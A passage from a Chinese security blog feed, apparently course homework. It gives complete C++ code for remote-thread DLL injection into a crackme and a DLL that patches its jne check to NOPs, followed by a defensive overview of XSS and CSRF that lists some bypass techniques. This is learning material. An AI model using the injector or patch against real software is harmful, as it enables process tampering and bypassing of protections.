class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteDllInjectDll</span><span class="params">(DWORD ProcessID)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span></span>;</span><br><span class="line"><span class="comment">//DWORD FindProcessID(const wchar_t* szProcessName);</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//Get the pid by name</span></span><br><span class="line">DWORD pid = <span class="built_in">FindProcessID</span>(<span class="string">&quot;crackme.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid:%d\n&quot;</span>, pid);</span><br><span class="line"><span class="comment">//DLL inject</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateRemoteDllInjectDll</span>(pid)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;faild to create remotedllinject evil.dll&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Create remotedllinject evil.dll</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteDllInjectDll</span><span class="params">(DWORD ProcessID)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> DllName[_MAX_PATH] =<span class="string">&quot;E:\\school\\TencentClass\\T1\\TencentClass_T1.dll&quot;</span>;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注入进程</span></span><br><span class="line">hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessID);<span class="comment">//打开进程获取句柄</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;OpenProcess error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> dwsize = <span class="built_in">sizeof</span>(DllName);</span><br><span class="line"><span class="type">void</span>* pDLLAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwsize, MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//分配虚拟内存，并且地址保存在pDLLAddr目录中</span></span><br><span class="line"><span class="keyword">if</span> (pDLLAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;VirtualAllocEx is error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pDLLAddr, (<span class="type">void</span>*)DllName, dwsize, <span class="literal">NULL</span>))</span><br><span class="line">&#123;<span class="comment">//把所需要的注入的dll文件目录字符注入给目标进程</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;WriteProcessMemory is error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取地址</span></span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;Kernel32&quot;</span>);<span class="comment">//获取kernel32.dll模块</span></span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;kernel32 error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPTHREAD_START_ROUTINE LoadLibraryAddr = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);<span class="comment">//进一步获取LoadLibraryA的函数地址</span></span><br><span class="line"><span class="keyword">if</span> (LoadLibraryAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;LoadLibraryAddr error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行远程线程注入</span></span><br><span class="line"><span class="comment">//HANDLE hRemotehandle = CreateRemoteThread(hProcess, NULL, 0,LoadLibraryAddr, pDLLAddr, 0, NULL); //创造远程线程注入到目标进程中</span></span><br><span class="line"><span class="comment">//if (!hRemotehandle) &#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%p\t%p\t%p\t&quot;, hProcess, LoadLibraryAddr, pDLLAddr);</span></span><br><span class="line"><span class="comment">//DWORD dwError = GetLastError();</span></span><br><span class="line"><span class="comment">//printf(&quot;CreateRemoteThread is error. Error Code: %d\n&quot;, dwError);</span></span><br><span class="line"><span class="comment">//return false;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">HANDLE hRemotehandle = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, LoadLibraryAddr, pDLLAddr, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//创造远程线程注入到目标进程中</span></span><br><span class="line"><span class="keyword">if</span> (!hRemotehandle) &#123;</span><br><span class="line">DWORD dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line"></span><br><span class="line">LPVOID lpMsgBuf;</span><br><span class="line"><span class="built_in">FormatMessageA</span>(</span><br><span class="line">FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">dwError,</span><br><span class="line"><span class="number">0</span>, <span class="comment">// Default language</span></span><br><span class="line">(LPSTR)&amp;lpMsgBuf,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;CreateRemoteThread is error. Error Code: %d - %s\n&quot;, dwError, lpMsgBuf);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">LocalFree</span>(lpMsgBuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%p\t%p\t%p\t&quot;, hProcess, LoadLibraryAddr, pDLLAddr);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemotehandle, INFINITE);<span class="comment">//等待返回</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hRemotehandle);<span class="comment">//关闭目标进程句柄</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;inject successfully!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find PID by name</span></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"><span class="comment">//hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);</span></span><br><span class="line">hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Process32First</span>(hSnapShot, &amp;pe);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))</span><br><span class="line">&#123;</span><br><span class="line">dwPID = pe.th32ProcessID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line"><span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="dll文件：dllmain-cpp-生成dllmain-exe"><a href="#dll文件：dllmain-cpp-生成dllmain-exe" class="headerlink" title="dll文件：dllmain.cpp(生成dllmain.exe)"></a>dll文件：dllmain.cpp(生成dllmain.exe)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="string">&quot;DLL Inject Sucess&quot;</span>);</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;dll sucess&quot;</span>, <span class="string">&quot;dll sucess&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//加载DLL时运行d</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH: </span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="作业结果"><a href="#作业结果" class="headerlink" title="作业结果"></a>作业结果</h4><ul><li>将ddlmain.cpp编译成64位的dll文件(注意一定要是64位)</li><li>将dll文件绝对路径填入evil.cpp中</li><li>将evil.cpp编译成64位的exe文件</li><li>在crackme执行的过程中，以管理员权限执行evil.exe</li><li>利用process Hacker查看改进程调用Modules</li><li>可以看到dll成功注入</li></ul><blockquote><p>注入成功并弹窗</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231217014350255.png" alt="image-20231217014350255" style="zoom:33%;" /><blockquote><p>Process Hackers截图，evil1.dll为恶意dll</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231217014435627.png" alt="image-20231217014435627" style="zoom: 33%;" /><h3 id="3-Hook程序"><a href="#3-Hook程序" class="headerlink" title="3.Hook程序"></a>3.Hook程序</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><blockquote><p> dll注入之Hook</p></blockquote><h5 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h5><pre><code>在Windows中，每个进程有自己私有的地址空间。当我们用指针来引用内存的时候，指针的值表示的是进程自己的地址空间中的一个内存地址。进程不能创建一个指针来引用属于其他进程的内存。因此，如果进程有一个缺陷会覆盖随机地址处的内存，那么这个缺陷不会影响到其他进程所使用的内存。独立的地址空间对开发人员和用户是非常有利的。对开发人员来说，系统更有可能捕获错误的内存读/写。对于用户来说，操作系统变得更加健壮了，因为一个应用程序的错误不会导致其他应用程序或操作系统崩溃。所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。可以通过很多种方式来实现DLL注入。    + 使用注册表来注入DLL    + 使用Windows Hook来注入DLL     + 使用远程线程来注入DLL   --本题的考点    + 使用木马DLL来注入    + 把DLL作为调试器来注入    + 使用CreateProcess来注入代码</code></pre><p>我们已经通过远程注入把恶意的dll注入进去了，下一步是编写dll，修改源程序逻辑，使得我们无论输入什么都返回正确。</p><h5 id="Hook技术"><a href="#Hook技术" class="headerlink" title="Hook技术"></a>Hook技术</h5><p><strong>hook技术就是让目标函数在执行之前先执行一段我们自己写的代码</strong></p><h4 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h4><p>IDA分析代码后发现最终判断flag的部分为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v33 );</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)v34 )</span><br><span class="line">  v35.m128i_i32[<span class="number">0</span>] = <span class="number">-872817740</span>;              <span class="comment">// 错误</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v35.m128i_i32[<span class="number">0</span>] = <span class="number">-1879061547</span>;             <span class="comment">//正确</span></span><br><span class="line">v35.m128i_i16[<span class="number">2</span>] = <span class="number">3338</span>;</span><br><span class="line">*(__int16 *)((<span class="type">char</span> *)v35.m128i_i16 + <span class="number">1</span>) ^= <span class="number">0x3736</span>u;</span><br><span class="line">v35.m128i_i8[<span class="number">3</span>] ^= <span class="number">0x38</span>u;</span><br><span class="line">v35.m128i_i8[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sub_7FF6422E1020</span>((__int64)&amp;v35, v34, <span class="number">-48</span>i64);     <span class="comment">//打印函数</span></span><br></pre></td></tr></table></figure><p>ce中找到相关的汇编代码</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219045931532.png" alt="image-20231219045931532" style="zoom: 33%;" /><p>于是我们有两个思路</p><ul><li>修改if判断逻辑，让判断一直为正确</li><li>修改最终的输出函数，一直输出正确</li></ul><p>第二个方法可以使用minHook实现，将原来的函数Hook为newPrintf函数就行</p><p>现主要实现第一种方法</p><p>把if判断的逻辑删掉和跳转错误的jne改成nop</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219051036666.png" alt="image-20231219051036666" style="zoom:50%;" /><p>最终效果</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219050607270.png" alt="image-20231219050607270" style="zoom: 50%;" /><p>使用代码实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHook</span><span class="params">(<span class="type">void</span>* pJNE)</span> </span>&#123;</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(pJNE, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect); </span><br><span class="line">    *(DWORD*)pJNE = <span class="number">0x90909090</span>; <span class="comment">// 换入nop nop nop nop</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(pJNE, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            HMODULE hCrackMe = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;crackme.exe&quot;</span>)); <span class="comment">//获得基地址</span></span><br><span class="line">            <span class="keyword">if</span> (hCrackMe != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                HMODULE jneAddress = (HMODULE)((<span class="type">size_t</span>)hCrackMe + <span class="number">0x18E7</span>);</span><br><span class="line">                <span class="built_in">SetHook</span>((<span class="type">void</span>*)jneAddress);</span><br><span class="line">                <span class="built_in">OutputDebugString</span>(<span class="string">&quot;Hook Sucess&quot;</span>);</span><br><span class="line">                <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hook sucess&quot;</span>, <span class="string">&quot;Hook sucess&quot;</span>, MB_OK);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\school\TencentClass\T1&gt; E:\app\MinGW-w64\bin\x86_64-w64-mingw32-g++ -shared -o Hook.dll  hook.cpp</span><br><span class="line">PS E:\school\TencentClass\T1&gt; E:\app\MinGW-w64\bin\x86_64-w64-mingw32-g++  -o evil.exe evil.cpp</span><br></pre></td></tr></table></figure><h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219053305127.png" alt="image-20231219053305127" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 游戏安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一场XSS和CSRF引发的血案</title>
      <link href="/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
      <url>/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><p>本文前半部分从四个角度讨论XSS与CSRF的区别与共性——原理，利用，绕过，防御。更多的站在防守方的角度，通过对比学习的方式更加辩证性的理解两个漏洞。后半部分深入分析防御XSS等一系列前端安全问题的新思路——内容安全策略（CSP），以及一些笔者关于前端安全的一些思考。</p><h1 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h1><h3 id="web安全基础"><a href="#web安全基础" class="headerlink" title="web安全基础"></a>web安全基础</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h4><p>从域和授权这两个概念理解同源策略。</p><ul><li>域分为域名和端口三个不部分。协议、域名和端口必须全部相同，才属于同源</li><li>通常情况下，不同域之间是不能相互访问资源的。只有被访问域的响应头中包含相关的origin，才会给相应的域授权访问。即通过origin可以拒绝授权某些跨域请求</li></ul><p>也就是说：同源策略分割和保护了Web 资源，通过限制非同域资源的访问，有效的阻止了攻击者的窃取和破坏行为</p><h4 id="Cookie-session机制"><a href="#Cookie-session机制" class="headerlink" title="Cookie&#x2F;session机制"></a><strong>Cookie&#x2F;session机制</strong></h4><p>这两个机制都是常用的会话跟踪技术。session 机制与 Cookie 机制不同的是，Cookie 是<strong>客户端</strong>机制，而 Session 则是<strong>服务端</strong>机制。在实际 Web 应用中，会话机制通常作为一种认证用户身份的手段。因此也是各大攻击场景中的首要攻击目标。</p><hr><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>跨站脚本攻击：<code>攻击者脚本</code> 嵌入 <code>被攻击网站</code>，获取用户cookie等隐私信息。</p><p>攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。</p><p>分类主要是：反射型、存储型、DOM型</p><blockquote><p> 反射型：应用程序从请求中获取一些输入并以不安全的方式将该输入嵌入到<strong>即时响应</strong>中</p></blockquote><p>特点：</p><ul><li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；</li><li>攻击者需要诱骗点击；</li><li>反馈率低，所以较难发现和响应修复；</li><li>盗取用户敏感保密信息</li></ul><blockquote><p>存储型：攻击脚本将被<strong>永久地存放在目标服务器</strong>端（数据库，内存，文件系统等）</p></blockquote><p>特点：</p><ul><li>持久性，植入在数据库中；</li><li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；</li><li>盗取用户敏感私密信息。</li></ul><blockquote><p>DOM型：DOM XSS直接通过javascript执行，程序并不会返回后台进行处理。</p></blockquote><p>特点：</p><ul><li>DOM xss属于是前端的安全问题，服务端的防御都无效</li><li>和反射型一样只能通过诱导受害者点击链接</li></ul><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul><li>大小写绕过</li><li>复写绕过</li><li>使用js事件绕过标签括号等</li><li>编码绕过</li></ul><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><ul><li><p>设置HttpOnly标志，防止非法用户通过Javascript读取cookie</p></li><li><p>Web 页面渲染的所有内容或者渲染的数据都尽量来自于服务端；</p></li><li><p>尽量不要从  URL，document.referrer，document.forms 等这种 API 中获取数据直接渲染；</p></li><li><p>前端渲染的时候对字段做转义编码（htmlencode，jsencode），特别是一些高频利用字段（&lt;,&gt;，”,’）</p></li><li><p>白名单-使用第三方库XSS，支持指定白名单</p></li><li><p>输入验证，对输入的数据进行严格的转义和编码，过滤</p><ul><li>将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li><li>对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload）等进行Javascript编码。</li><li>往 HTML 标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行 HTML Entity 编码 HTML 字符实体</li></ul></li><li><p>服务端的输出检查，使用编码或转义的方式来防御 XSS 攻击。</p><ul><li>例如利用sanitize-html对输出内容进行有规则的过滤之后再输出到页面中。</li></ul></li><li><p>输入长度限制</p></li></ul><hr><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>跨站请求伪造：<code>已登录用户</code> 访问 <code>攻击者网站</code>，攻击网站向被攻击网站发起恶意请求（利用浏览器会自动携带cookie）。</p><p>用户在一个没有保护的网站下处于登录状态，并在不知情的情况下用同一个浏览器访问了攻击者发来含 有恶意代码的网址，导致攻击者使用了用户的身份（cookie）在网站中执行恶意操作</p><p>分类主要是：GET型、POST型</p><blockquote><p>GET型</p></blockquote><p>攻击者直接诱导受害者恶意的URL链接，如果服务器没有对该请求做判断的话，就会自动发起GET请求从而利用受害者身份进行一系列操作。</p><blockquote><p>POST型</p></blockquote><p>攻击者需要在他的站点上伪造 POST 请求，当用户打开该站点时，自动提交 POST 请求。</p><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><ul><li>Referer源绕过<ul><li>置空：删除referer内容</li><li>子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 httpx:&#x2F;&#x2F;baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了</li><li>修改域名：如果原来的的 httpx:&#x2F;&#x2F;dafsec.weiyigeek.org ，那么可以改成</li><li>httpx:&#x2F;&#x2F;adafsec.weiyigeek.org</li><li>删除 X-CSRFToken 报头然后将POST请求改为GET</li></ul></li><li>Token Bypass<ul><li>删除Token参数字段  </li><li>替换相同长度的值</li><li>解码CSRF令牌</li><li>仅使用令牌的静态部分</li><li>配合XSS等html注入手法获取token，随机发动CSRF攻击</li></ul></li><li>X-Request-with Bypass<ul><li>利用swf进行绕过</li><li>前提条件：<ul><li>可利用swf未校验referer和origin 的bypass 含json xml格式的数据， </li><li>可使用swf添加X-Request-With</li></ul></li><li>工具： httpx:&#x2F;&#x2F;github.com&#x2F;Qclover&#x2F;CSRF</li></ul></li><li>旁路cookie注入绕过 <ul><li>描述：攻击者可以通过cookie注入绕过双重提交cookie保护<ul><li>cookie注入的方法: CRLF-injection (HTML响应拆分注入漏洞) </li><li>Browser bugs (like CVE-2016-9078 in Firefox)</li></ul></li></ul></li></ul><h4 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h4><blockquote><p>原理</p></blockquote><p>CSRF攻击防御的重点是利用cookie的值只能被第一方读取，无法读取第三方的cookie值：</p><p>一个简单可行的方法就是在客户端网页上再次添加一个cookie，保存一个随机数，而用户访问的时候，先读取这个cookie的值，hash一下这个cookie值并发送给服务器，服务器接收到用户的hash之后的值，同时取出之前设置在用户端的cookie的值，用同样的算法hash这个cookie值，比较这两个hash值，相同则是合法。（如果用户访问了病毒网站，也想带这个cookie去访问的时候，此时，因为病毒网站无法获取第三方cookie的值，所以他也就无法hash这个随机数，所以也就会被服务器校验的过滤掉）</p><blockquote><p>具体防御方法</p></blockquote><ul><li><p>验证 HTTP Referer 字段；</p></li><li><p>在请求地址中添加完备的 token 并验证；</p></li><li><p>在 HTTP 头中自定义属性并验证</p><ul><li><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的 形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest </p><p>这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入 其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求 的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中 去。</p></li></ul></li><li><p>Chrome 浏览器端启用 SameSite cookie，也就是禁用第三方cookie。或者开发时使用SameSite并设置为strict</p></li><li><p>使用验证码，验证码会强制用户必须与应用进行交互，才能完成最终请求。是的用户无法在不知觉的情况下进行恶意操作</p></li></ul><h1 id="对比学习"><a href="#对比学习" class="headerlink" title="对比学习"></a>对比学习</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF和XSS都是客户端攻击，它们<strong>滥用同源策略</strong>，利用web应用程序和受害用户之间的信任关系。从而利用受害者的身份或Cookie信息进行其他操作。</p><p>但是，XSS 和 CSRF 攻击之间存在一些原理上的差异：</p><p>XSS产生原因类似于SQL注入，源于用户输入的数据被当成了代码执行，而CSRF产生原因更像是浏览器为了增加用户的使用体验弱化一些跨域和第三方Cookie登录的验证。</p><p>所以本质上讲，XSS 是<strong>代码注入</strong>问题，属于’攻击’，CSRF 是 <strong>HTTP</strong> 问题，属于’伪造’</p><p>XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行，算是一个漏洞层面问题。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie 里面，算是一个关于http和浏览器设计机制层面的问题。</p><p>其次，XSS 利用的是用户对指定网站的信任，恶意代码存储在站点中，CSRF 利用的是网站对用户网页浏览器的信任，恶意代码存储在受害用户访问的第三方站点中。</p><h4 id="利用"><a href="#利用" class="headerlink" 